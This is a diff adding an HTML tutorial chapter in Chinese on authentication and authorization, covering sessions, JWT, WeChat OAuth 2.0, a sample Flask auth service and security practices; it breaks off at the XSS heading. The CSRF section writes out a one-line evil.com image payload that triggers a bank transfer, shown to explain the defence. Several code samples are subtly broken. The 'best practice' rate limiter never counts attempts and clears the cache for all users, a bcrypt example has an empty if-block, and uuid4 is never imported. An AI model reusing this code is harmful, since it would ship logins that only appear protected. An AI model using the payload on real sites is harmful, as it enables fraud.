@@ -1,0 +1,981 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>认证与授权体系 · Vibe Coding 101</title><link rel="stylesheet" href="book.css"></head>
+<body><a class="skip" href="#main">跳到正文</a><header><a href="index.html">Vibe Coding 101 · 全书目录</a><a href="../../开始阅读.html">阅读入口</a></header>
+<main id="main" tabindex="-1"><p class="stage">附录 · 123 / 195</p><article><h1 id="认证与授权体系">认证与授权体系</h1><details class="contents"><summary>本章目录 <span>· 1 节</span></summary><nav aria-label="本章目录"><ul><li><a href="#认证与授权原理">认证与授权原理</a><ul><li><a href="#0-引言系统的门禁">0. 引言：系统的&quot;门禁&quot;</a></li><li><a href="#1-基础概念认证-vs-授权">1. 基础概念：认证 vs 授权</a></li><li><a href="#2-方案演进史">2. 方案演进史</a></li><li><a href="#3-oauth-20第三方登录">3. OAuth 2.0：第三方登录</a></li><li><a href="#4-实战设计一个完整的鉴权系统">4. 实战：设计一个完整的鉴权系统</a></li><li><a href="#5-安全最佳实践">5. 安全最佳实践</a></li><li><a href="#6-总结与学习路线">6. 总结与学习路线</a></li><li><a href="#7-名词速查表-glossary-1">7. 名词速查表 (Glossary)</a></li></ul></li></ul></nav></details><h2 id="认证与授权原理">认证与授权原理</h2>
+<blockquote>
+<p><strong>学习指南</strong>：本章节带你深入理解后端系统的&quot;门禁系统&quot;——鉴权与授权。我们将从最基础的&quot;你是谁&quot;讲起，一步步掌握 Session、JWT、OAuth2.0 等现代鉴权方案。</p>
+</blockquote>
+<h3 id="0-引言系统的门禁">0. 引言：系统的&quot;门禁&quot;</h3>
+<p>你登录微信后，为什么关掉再打开还是登录状态？
+你访问 B 站，为什么知道你是大会员还是普通用户？
+你用微信扫码登录第三方网站，为什么不用输入密码？</p>
+<p>这背后都有一个核心系统：<strong>鉴权与授权 (Authentication &amp; Authorization)</strong>。</p>
+<p>如果把后端系统比作一栋大楼：</p>
+<ul>
+<li><strong>鉴权 (Authentication)</strong>：确认&quot;你是谁&quot;（验证身份证/门禁卡）。</li>
+<li><strong>授权 (Authorization)</strong>：确认&quot;你能去哪里&quot;（VIP 能进 VIP 休息室，普通用户不行）。</li>
+</ul>
+<h4 id="01-鉴权的动机">0.1 鉴权的动机</h4>
+<p>只有一个理由：<strong>保护资源</strong>。</p>
+<ul>
+<li><strong>隐私保护</strong>：你的个人信息、聊天记录，只有你能看。</li>
+<li><strong>权限控制</strong>：管理员可以删除用户，普通用户不行。</li>
+<li><strong>防止滥用</strong>：防止恶意调用、刷接口。</li>
+</ul>
+<h4 id="02-交互式演示登录流程">0.2 交互式演示：登录流程</h4>
+<p>我们通过一个真实的登录演示，来理解认证和授权是如何工作的。</p>
+<p><strong>关键点</strong>：鉴权是第一道防线，所有敏感操作都必须先验证身份。</p>
+<h3 id="1-基础概念认证-vs-授权">1. 基础概念：认证 vs 授权</h3>
+<h4 id="11-认证-authentication你是谁">1.1 认证 (Authentication)：你是谁</h4>
+<p>确认用户的身份。</p>
+<ul>
+<li><em>例子</em>：输入用户名密码、刷指纹、人脸识别。</li>
+<li><em>输出</em>：一个代表&quot;你&quot;的令牌（Token）。</li>
+<li><em>英文简称</em>：<strong>AuthN</strong></li>
+</ul>
+<h4 id="12-授权-authorization你能干什么">1.2 授权 (Authorization)：你能干什么</h4>
+<p>确认用户有哪些权限。</p>
+<ul>
+<li><em>例子</em>：管理员可以删除文章，普通用户只能点赞。</li>
+<li><em>输出</em>：允许或拒绝访问。</li>
+<li><em>英文简称</em>：<strong>AuthZ</strong></li>
+</ul>
+<h4 id="13-两者的关系">1.3 两者的关系</h4>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code>用户请求 → 认证 (你是谁？) → 授权 (你能做吗？) → 执行业务逻辑
+           ↓                        ↓
+      验证身份               检查权限
+      (Token 有效？)         (有 delete 权限？)
+</code></pre>
+<p><strong>关键点</strong>：先认证，再授权。只有确认了&quot;你是谁&quot;，才能判断&quot;你能干什么&quot;。</p>
+<h3 id="2-方案演进史">2. 方案演进史</h3>
+<h4 id="21-第一代http-basic-authentication">2.1 第一代：HTTP Basic Authentication</h4>
+<p>最古老的方案，直接把用户名密码放在 HTTP 头里。</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-http">GET /api/user/profile HTTP/1.1
+Host: example.com
+Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
+                      (base64(&quot;username:password&quot;))
+</code></pre>
+<ul>
+<li><strong>优点</strong>：简单，所有浏览器都支持。</li>
+<li><strong>缺点</strong>：<ul>
+<li>不安全（Base64 可解码，相当于明文）。</li>
+<li>每次请求都要传密码（容易被截获）。</li>
+<li>无法主动注销（除非关闭浏览器）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>结论</strong>：只适合内部测试工具，绝不用于生产环境。</p>
+<h4 id="22-第二代session--cookie">2.2 第二代：Session + Cookie</h4>
+<p>Web 开发的经典方案。</p>
+<p><strong>流程</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code>1. 用户登录 (POST /login)
+   → 服务器验证用户名密码
+   → 创建 Session（在服务器内存或 Redis）
+   → 返回 Set-Cookie: session_id=abc123
+
+2. 后续请求
+   → 浏览器自动带上 Cookie: session_id=abc123
+   → 服务器根据 session_id 查找 Session
+   → 找到就认为&quot;你是你&quot;
+</code></pre>
+<p><strong>代码示例</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># 后端 (Python Flask)
+from flask import session, request
+
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+    password = request.json[&quot;password&quot;]
+
+    # 验证用户名密码
+    user = db.authenticate(username, password)
+    if user:
+        # 创建 Session
+        session[&quot;user_id&quot;] = user.id
+        session[&quot;role&quot;] = user.role
+        return {&quot;status&quot;: &quot;success&quot;}
+    else:
+        return {&quot;error&quot;: &quot;用户名或密码错误&quot;}, 401
+
+@app.route(&quot;/api/admin/users&quot;)
+def get_users():
+    # 检查 Session
+    if &quot;user_id&quot; not in session:
+        return {&quot;error&quot;: &quot;未登录&quot;}, 401
+
+    # 检查权限
+    if session.get(&quot;role&quot;) != &quot;admin&quot;:
+        return {&quot;error&quot;: &quot;权限不足&quot;}, 403
+
+    # 执行业务逻辑
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}
+</code></pre>
+<p><strong>优点</strong>：</p>
+<ul>
+<li>简单直观，易于理解。</li>
+<li>服务端可以主动注销（删除 Session）。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li><strong>服务器有状态</strong>：需要存储 Session，多台服务器需要共享（如 Redis）。</li>
+<li><strong>跨域困难</strong>：Cookie 默认不能跨域（CORS 问题）。</li>
+<li><strong>CSRF 攻击</strong>：恶意网站可以冒用你的 Cookie。</li>
+</ul>
+<p><strong>结论</strong>：适合传统 Web 应用（服务器端渲染），不适合移动端和现代 SPA。</p>
+<h4 id="23-第三代token-jwt">2.3 第三代：Token (JWT)</h4>
+<p>现代 Web 的主流方案。</p>
+<p><strong>核心思想</strong>：不在服务端存储状态，把用户信息加密成 Token，放在客户端。</p>
+<p><strong>JWT 结构</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code>JWT = Header.Payload.Signature
+
+例子:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+ |--------------------------------| |-----------------------------------------------| |----------------------------|
+           Header                           Payload                                      Signature
+</code></pre>
+<ul>
+<li><strong>Header</strong>：算法信息（如 <code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}</code>）。</li>
+<li><strong>Payload</strong>：用户信息（如 <code>{&quot;user_id&quot;: 123, &quot;role&quot;: &quot;admin&quot;, &quot;exp&quot;: 1616239022}</code>）。</li>
+<li><strong>Signature</strong>：签名（防篡改）。</li>
+</ul>
+<p><strong>流程</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># 1. 用户登录
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+    password = request.json[&quot;password&quot;]
+
+    user = db.authenticate(username, password)
+    if user:
+        # 生成 JWT
+        token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;role&quot;: user.role,
+                &quot;exp&quot;: datetime.now() + timedelta(hours=24)  # 24 小时过期
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+        return {&quot;token&quot;: token}
+    else:
+        return {&quot;error&quot;: &quot;用户名或密码错误&quot;}, 401
+
+# 2. 后续请求
+@app.route(&quot;/api/admin/users&quot;)
+def get_users():
+    # 从 Header 获取 Token
+    auth_header = request.headers.get(&quot;Authorization&quot;)
+    if not auth_header or not auth_header.startswith(&quot;Bearer &quot;):
+        return {&quot;error&quot;: &quot;未提供 Token&quot;}, 401
+
+    token = auth_header.split(&quot; &quot;)[1]
+
+    try:
+        # 验证并解析 Token
+        payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+    except jwt.ExpiredSignatureError:
+        return {&quot;error&quot;: &quot;Token 已过期&quot;}, 401
+    except jwt.InvalidTokenError:
+        return {&quot;error&quot;: &quot;Token 无效&quot;}, 401
+
+    # 检查权限
+    if payload.get(&quot;role&quot;) != &quot;admin&quot;:
+        return {&quot;error&quot;: &quot;权限不足&quot;}, 403
+
+    # 执行业务逻辑
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}
+</code></pre>
+<p><strong>优点</strong>：</p>
+<ul>
+<li><strong>无状态</strong>：服务端不存储 Session，易于横向扩展。</li>
+<li><strong>跨域友好</strong>：放在 Header 里，不受 Cookie 跨域限制。</li>
+<li><strong>移动端友好</strong>：原生 App 也能轻松使用。</li>
+<li><strong>信息丰富</strong>：Payload 可以存用户信息、权限等。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li><strong>无法主动注销</strong>：Token 一旦签发，在过期前一直有效（除非用黑名单）。</li>
+<li><strong>Payload 可见</strong>：Base64 编码，不能存敏感信息（如密码）。</li>
+<li><strong>Token 过大</strong>：每次请求都要带上，几百字节。</li>
+</ul>
+<p><strong>结论</strong>：现代 Web 和移动端的标准方案。</p>
+<h3 id="3-oauth-20第三方登录">3. OAuth 2.0：第三方登录</h3>
+<p>你肯定见过这个按钮：&quot;使用微信登录&quot;、&quot;使用 Google 登录&quot;。</p>
+<p>这就是 <strong>OAuth 2.0</strong>：一个授权框架（不是认证！）。</p>
+<h4 id="31-核心角色">3.1 核心角色</h4>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格，可横向滚动"><table>
+<thead>
+<tr>
+<th align="left">角色</th>
+<th align="left">说明</th>
+<th align="left">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Resource Owner</strong></td>
+<td align="left">资源所有者（用户）</td>
+<td align="left">你</td>
+</tr>
+<tr>
+<td align="left"><strong>Client</strong></td>
+<td align="left">第三方应用</td>
+<td align="left">某个网站</td>
+</tr>
+<tr>
+<td align="left"><strong>Authorization Server</strong></td>
+<td align="left">授权服务器</td>
+<td align="left">微信、Google</td>
+</tr>
+<tr>
+<td align="left"><strong>Resource Server</strong></td>
+<td align="left">资源服务器</td>
+<td align="left">微信的用户信息 API</td>
+</tr>
+</tbody></table></div>
+<h4 id="32-授权码模式-authorization-code-flow">3.2 授权码模式 (Authorization Code Flow)</h4>
+<p>最安全的模式，适合有后端的服务器。</p>
+<p><strong>流程</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code>1. 用户点击&quot;使用微信登录&quot;
+   → 跳转到微信授权页面
+   https://open.weixin.qq.com/connect/qrconnect?
+     appid=APPID&amp;
+     redirect_uri=https://yourapp.com/callback&amp;
+     response_type=code&amp;
+     scope=snsapi_login&amp;
+     state=STATE
+
+2. 用户扫码并同意授权
+   → 微信重定向回你的网站
+   https://yourapp.com/callback?code=AUTHORIZATION_CODE&amp;state=STATE
+
+3. 你的后端用 code 换取 access_token
+   POST https://api.weixin.qq.com/sns/oauth2/access_token
+   {
+     &quot;appid&quot;: &quot;APPID&quot;,
+     &quot;secret&quot;: &quot;SECRET&quot;,
+     &quot;code&quot;: &quot;AUTHORIZATION_CODE&quot;,
+     &quot;grant_type&quot;: &quot;authorization_code&quot;
+   }
+   → 返回: { &quot;access_token&quot;: &quot;...&quot;, &quot;openid&quot;: &quot;...&quot; }
+
+4. 用 access_token 获取用户信息
+   GET https://api.weixin.qq.com/sns/userinfo?
+     access_token=ACCESS_TOKEN&amp;
+     openid=OPENID
+   → 返回: { &quot;nickname&quot;: &quot;张三&quot;, &quot;headimgurl&quot;: &quot;...&quot; }
+</code></pre>
+<p><strong>代码示例</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python">from flask import request, redirect
+
+@app.route(&quot;/login/wechat&quot;)
+def login_wechat():
+    # 1. 重定向到微信授权页面
+    auth_url = (
+        &quot;https://open.weixin.qq.com/connect/qrconnect&quot;
+        f&quot;?appid={APPID}&quot;
+        f&quot;&amp;redirect_uri={urlencode(REDIRECT_URI)}&quot;
+        &quot;&amp;response_type=code&quot;
+        &quot;&amp;scope=snsapi_login&quot;
+        f&quot;&amp;state={generate_state()}&quot;
+    )
+    return redirect(auth_url)
+
+@app.route(&quot;/callback&quot;)
+def wechat_callback():
+    # 2. 获取 code
+    code = request.args.get(&quot;code&quot;)
+    state = request.args.get(&quot;state&quot;)
+
+    # 验证 state（防 CSRF）
+    if not verify_state(state):
+        return {&quot;error&quot;: &quot;Invalid state&quot;}, 400
+
+    # 3. 用 code 换取 access_token
+    token_resp = requests.post(
+        &quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;,
+        params={
+            &quot;appid&quot;: APPID,
+            &quot;secret&quot;: SECRET,
+            &quot;code&quot;: code,
+            &quot;grant_type&quot;: &quot;authorization_code&quot;
+        }
+    ).json()
+
+    access_token = token_resp[&quot;access_token&quot;]
+    openid = token_resp[&quot;openid&quot;]
+
+    # 4. 获取用户信息
+    user_info = requests.get(
+        &quot;https://api.weixin.qq.com/sns/userinfo&quot;,
+        params={
+            &quot;access_token&quot;: access_token,
+            &quot;openid&quot;: openid
+        }
+    ).json()
+
+    # 5. 本地创建或更新用户
+    user = db.get_or_create_user(
+        openid=openid,
+        nickname=user_info[&quot;nickname&quot;],
+        avatar=user_info[&quot;headimgurl&quot;]
+    )
+
+    # 6. 生成本系统的 JWT
+    token = jwt.encode(
+        {&quot;user_id&quot;: user.id, &quot;exp&quot;: ...},
+        SECRET_KEY
+    )
+
+    return {&quot;token&quot;: token}
+</code></pre>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li><strong>code 只能用一次</strong>：用完即失效，防止截获。</li>
+<li><strong>state 防 CSRF</strong>：生成随机字符串，回调时验证，防止恶意网站伪造。</li>
+<li><strong>redirect_uri 必须匹配</strong>：提前在微信开放平台注册，防止重定向攻击。</li>
+</ul>
+<h4 id="33-其他模式">3.3 其他模式</h4>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格，可横向滚动"><table>
+<thead>
+<tr>
+<th align="left">模式</th>
+<th align="left">适用场景</th>
+<th align="left">安全性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>授权码模式</strong></td>
+<td align="left">有后端的服务器</td>
+<td align="left">⭐⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td align="left"><strong>简化模式 (Implicit)</strong></td>
+<td align="left">纯前端应用（SPA）</td>
+<td align="left">⭐⭐⭐（不推荐）</td>
+</tr>
+<tr>
+<td align="left"><strong>密码模式 (Resource Owner)</strong></td>
+<td align="left">高度信任的应用（如官方 App）</td>
+<td align="left">⭐⭐</td>
+</tr>
+<tr>
+<td align="left"><strong>客户端模式 (Client Credentials)</strong></td>
+<td align="left">服务器间通信（无用户）</td>
+<td align="left">⭐⭐⭐⭐</td>
+</tr>
+</tbody></table></div>
+<h3 id="4-实战设计一个完整的鉴权系统">4. 实战：设计一个完整的鉴权系统</h3>
+<h4 id="41-需求分析">4.1 需求分析</h4>
+<ul>
+<li><strong>多端支持</strong>：Web、iOS、Android。</li>
+<li><strong>第三方登录</strong>：微信、Google。</li>
+<li><strong>权限控制</strong>：普通用户、VIP、管理员。</li>
+<li><strong>安全</strong>：防刷、防劫持、防重放。</li>
+</ul>
+<h4 id="42-架构设计">4.2 架构设计</h4>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code>┌─────────────┐
+│   客户端     │
+└──────┬──────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│         API Gateway             │
+│  - Rate Limiting (限流)          │
+│  - Token Validation (校验)       │
+└──────┬──────────────────────────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│      Auth Service (鉴权服务)     │
+│  - 注册、登录                    │
+│  - Token 签发与验证              │
+│  - OAuth 2.0 集成                │
+└──────┬──────────────────────────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│    Business Services             │
+│  - User Service                  │
+│  - Order Service                 │
+│  - Payment Service               │
+└─────────────────────────────────┘
+</code></pre>
+<h4 id="43-数据库设计">4.3 数据库设计</h4>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-sql">-- 用户表
+CREATE TABLE users (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(50) UNIQUE NOT NULL,
+    password_hash VARCHAR(255) NOT NULL,  -- bcrypt 哈希
+    email VARCHAR(100) UNIQUE,
+    role ENUM(&#39;user&#39;, &#39;vip&#39;, &#39;admin&#39;) DEFAULT &#39;user&#39;,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_username (username),
+    INDEX idx_email (email)
+);
+
+-- 第三方登录绑定表
+CREATE TABLE user_auth_providers (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    user_id BIGINT NOT NULL,
+    provider ENUM(&#39;wechat&#39;, &#39;google&#39;, &#39;github&#39;) NOT NULL,
+    provider_user_id VARCHAR(100) NOT NULL,  -- 第三方的用户 ID
+    access_token TEXT,  -- 加密存储
+    refresh_token TEXT,
+    expires_at TIMESTAMP,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- Token 黑名单（用于主动注销）
+CREATE TABLE token_blacklist (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT 的 JTI (唯一标识)
+    expired_at TIMESTAMP NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    INDEX idx_expired_at (expired_at)
+);
+</code></pre>
+<h4 id="44-代码实现">4.4 代码实现</h4>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># auth_service.py
+import bcrypt
+import jwt
+from datetime import datetime, timedelta
+
+SECRET_KEY = &quot;your-secret-key-here&quot;  # 生产环境用环境变量
+
+class AuthService:
+    def register(self, username: str, password: str, email: str = None):
+        # 1. 检查用户名是否存在
+        if db.get_user_by_username(username):
+            raise ValueError(&quot;用户名已存在&quot;)
+
+        # 2. 哈希密码（bcrypt）
+        password_hash = bcrypt.hashpw(
+            password.encode(&#39;utf-8&#39;),
+            bcrypt.gensalt(rounds=12)
+        ).decode(&#39;utf-8&#39;)
+
+        # 3. 创建用户
+        user = db.create_user(
+            username=username,
+            password_hash=password_hash,
+            email=email
+        )
+
+        # 4. 签发 Token
+        return self._generate_tokens(user)
+
+    def login(self, username: str, password: str):
+        # 1. 查询用户
+        user = db.get_user_by_username(username)
+        if not user:
+            raise ValueError(&quot;用户名或密码错误&quot;)
+
+        # 2. 验证密码
+        if not bcrypt.checkpw(
+            password.encode(&#39;utf-8&#39;),
+            user.password_hash.encode(&#39;utf-8&#39;)
+        ):
+            raise ValueError(&quot;用户名或密码错误&quot;)
+
+        # 3. 签发 Token
+        return self._generate_tokens(user)
+
+    def _generate_tokens(self, user):
+        now = datetime.now()
+
+        # Access Token (短期，如 1 小时)
+        access_token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;role&quot;: user.role,
+                &quot;type&quot;: &quot;access&quot;,
+                &quot;iat&quot;: now,
+                &quot;exp&quot;: now + timedelta(hours=1),
+                &quot;jti&quot;: str(uuid4())  # 唯一标识
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+
+        # Refresh Token (长期，如 30 天)
+        refresh_token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;type&quot;: &quot;refresh&quot;,
+                &quot;iat&quot;: now,
+                &quot;exp&quot;: now + timedelta(days=30),
+                &quot;jti&quot;: str(uuid4())
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+
+        return {
+            &quot;access_token&quot;: access_token,
+            &quot;refresh_token&quot;: refresh_token,
+            &quot;token_type&quot;: &quot;Bearer&quot;,
+            &quot;expires_in&quot;: 3600  # access_token 过期时间（秒）
+        }
+
+    def refresh(self, refresh_token: str):
+        try:
+            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+            if payload.get(&quot;type&quot;) != &quot;refresh&quot;:
+                raise ValueError(&quot;Invalid token type&quot;)
+
+            user = db.get_user_by_id(payload[&quot;user_id&quot;])
+            return self._generate_tokens(user)
+        except jwt.ExpiredSignatureError:
+            raise ValueError(&quot;Refresh token 已过期&quot;)
+        except jwt.InvalidTokenError:
+            raise ValueError(&quot;Refresh token 无效&quot;)
+
+    def logout(self, token: str):
+        # 将 Token 加入黑名单
+        payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+        db.add_to_blacklist(
+            jti=payload[&quot;jti&quot;],
+            expired_at=datetime.fromtimestamp(payload[&quot;exp&quot;])
+        )
+
+    def verify_token(self, token: str):
+        try:
+            payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+
+            # 检查是否在黑名单中
+            if db.is_token_blacklisted(payload[&quot;jti&quot;]):
+                raise ValueError(&quot;Token 已注销&quot;)
+
+            return payload
+        except jwt.ExpiredSignatureError:
+            raise ValueError(&quot;Token 已过期&quot;)
+        except jwt.InvalidTokenError:
+            raise ValueError(&quot;Token 无效&quot;)
+
+# API 装饰器
+def require_auth(auth_service: AuthService):
+    def decorator(f):
+        def wrapper(*args, **kwargs):
+            # 从 Header 获取 Token
+            auth_header = request.headers.get(&quot;Authorization&quot;)
+            if not auth_header or not auth_header.startswith(&quot;Bearer &quot;):
+                return {&quot;error&quot;: &quot;未提供 Token&quot;}, 401
+
+            token = auth_header.split(&quot; &quot;)[1]
+
+            try:
+                # 验证 Token
+                payload = auth_service.verify_token(token)
+                # 将用户信息注入到请求上下文
+                request.user = payload
+                return f(*args, **kwargs)
+            except ValueError as e:
+                return {&quot;error&quot;: str(e)}, 401
+
+        return wrapper
+    return decorator
+
+def require_role(*roles):
+    def decorator(f):
+        def wrapper(*args, **kwargs):
+            if not hasattr(request, &quot;user&quot;):
+                return {&quot;error&quot;: &quot;未登录&quot;}, 401
+
+            if request.user[&quot;role&quot;] not in roles:
+                return {&quot;error&quot;: &quot;权限不足&quot;}, 403
+
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+# 使用示例
+@app.route(&quot;/api/admin/users&quot;, methods=[&quot;GET&quot;])
+@require_auth(auth_service)
+@require_role(&quot;admin&quot;)
+def get_users():
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}
+
+@app.route(&quot;/api/user/profile&quot;, methods=[&quot;GET&quot;])
+@require_auth(auth_service)
+def get_profile():
+    user = db.get_user_by_id(request.user[&quot;user_id&quot;])
+    return {&quot;user&quot;: user}
+
+@app.route(&quot;/auth/refresh&quot;, methods=[&quot;POST&quot;])
+def refresh_token():
+    refresh_token = request.json.get(&quot;refresh_token&quot;)
+    try:
+        tokens = auth_service.refresh(refresh_token)
+        return tokens
+    except ValueError as e:
+        return {&quot;error&quot;: str(e)}, 401
+</code></pre>
+<h3 id="5-安全最佳实践">5. 安全最佳实践</h3>
+<h4 id="51-密码存储">5.1 密码存储</h4>
+<p><strong>❌ 错误做法</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># 明文存储（绝对不行！）
+db.save_password(username, password)
+
+# MD5 / SHA1 哈希（不够安全，容易被彩虹表破解）
+hash = md5(password)
+db.save_password(username, hash)
+</code></pre>
+<p><strong>✅ 正确做法</strong>：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># bcrypt（自适应哈希，慢哈希防暴力破解）
+import bcrypt
+
+password_hash = bcrypt.hashpw(
+    password.encode(&#39;utf-8&#39;),
+    bcrypt.gensalt(rounds=12)  # rounds 越大越安全，但也越慢
+)
+
+# 验证
+if bcrypt.checkpw(password.encode(&#39;utf-8&#39;), password_hash):
+    # 密码正确
+</code></pre>
+<p><strong>为什么 bcrypt？</strong></p>
+<ul>
+<li><strong>慢</strong>：故意设计得很慢（毫秒级），防暴力破解。</li>
+<li><strong>自适应</strong>：可以调整 rounds，随硬件变强而增强。</li>
+<li><strong>加盐</strong>：自带随机盐，防彩虹表。</li>
+</ul>
+<h4 id="52-防暴力破解">5.2 防暴力破解</h4>
+<ul>
+<li><strong>限流</strong>：同一个 IP / 用户名，1 分钟只能试 5 次。</li>
+<li><strong>验证码</strong>：失败 3 次后要求输入验证码。</li>
+<li><strong>账号锁定</strong>：失败 10 次后锁定账号 30 分钟。</li>
+</ul>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python">from functools import lru_cache
+import time
+
+@lru_cache(maxsize=10000)
+def get_login_attempts(identifier: str) -&gt; tuple:
+    &quot;&quot;&quot;返回 (尝试次数, 第一次尝试时间)&quot;&quot;&quot;
+    return (0, 0)
+
+def check_rate_limit(identifier: str):
+    attempts, first_attempt = get_login_attempts(identifier)
+    now = time.time()
+
+    # 1 分钟内清零
+    if now - first_attempt &gt; 60:
+        get_login_attempts.cache_clear()
+        return True
+
+    # 超过 5 次，拒绝
+    if attempts &gt;= 5:
+        return False
+
+    return True
+
+def record_login_attempt(identifier: str):
+    attempts, first_attempt = get_login_attempts(identifier)
+    if attempts == 0:
+        first_attempt = time.time()
+    get_login_attempts.cache_clear()
+    get_login_attempts(identifier)  # 重新缓存
+
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+
+    # 检查限流
+    if not check_rate_limit(username):
+        return {&quot;error&quot;: &quot;尝试次数过多，请 1 分钟后再试&quot;}, 429
+
+    password = request.json[&quot;password&quot;]
+
+    # 验证密码
+    user = db.get_user_by_username(username)
+    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
+        # 登录成功，清空计数
+        get_login_attempts.cache_clear()
+        return {&quot;token&quot;: generate_token(user)}
+    else:
+        # 登录失败，记录
+        record_login_attempt(username)
+        return {&quot;error&quot;: &quot;用户名或密码错误&quot;}, 401
+</code></pre>
+<h4 id="53-防-csrf-cross-site-request-forgery">5.3 防 CSRF (Cross-Site Request Forgery)</h4>
+<p><strong>攻击场景</strong>：
+你登录了银行网站 <code>bank.com</code>，然后访问了恶意网站 <code>evil.com</code>。<code>evil.com</code> 的页面里有一段代码：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-html">&lt;img src=&quot;https://bank.com/api/transfer?to=attacker&amp;amount=10000&quot; /&gt;
+</code></pre>
+<p>你的浏览器会带上银行的 Cookie 发起这个请求（跨域请求），导致资金被转走。</p>
+<p><strong>防御措施</strong>：</p>
+<ol>
+<li><strong>CSRF Token</strong>：<ul>
+<li>服务端生成随机 Token，放在表单里。</li>
+<li>提交时验证 Token 是否匹配。</li>
+</ul>
+</li>
+</ol>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python">from flask import session
+
+@app.route(&quot;/api/transfer&quot;, methods=[&quot;POST&quot;])
+def transfer():
+    # 验证 CSRF Token
+    token = request.headers.get(&quot;X-CSRF-Token&quot;)
+    if token != session.get(&quot;csrf_token&quot;):
+        return {&quot;error&quot;: &quot;CSRF Token 无效&quot;}, 403
+
+    # 执行转账
+    ...
+</code></pre>
+<ol start="2">
+<li><strong>SameSite Cookie</strong>：<ul>
+<li>设置 Cookie 的 <code>SameSite</code> 属性为 <code>Strict</code> 或 <code>Lax</code>。</li>
+</ul>
+</li>
+</ol>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python"># Flask 示例
+app.config.update(
+    SESSION_COOKIE_SAMESITE=&#39;Lax&#39;,  # 或 &#39;Strict&#39;
+    SESSION_COOKIE_SECURE=True      # 只允许 HTTPS
+)
+</code></pre>
+<ol start="3">
+<li><strong>使用 JWT（不用 Cookie）</strong>：<ul>
+<li>JWT 存在 <code>localStorage</code>，不会自动带上，天然防 CSRF。</li>
+</ul>
+</li>
+</ol>
+<h4 id="54-防-xss-cross-site-scripting">5.4 防 XSS (Cross-Site Scripting)</h4>
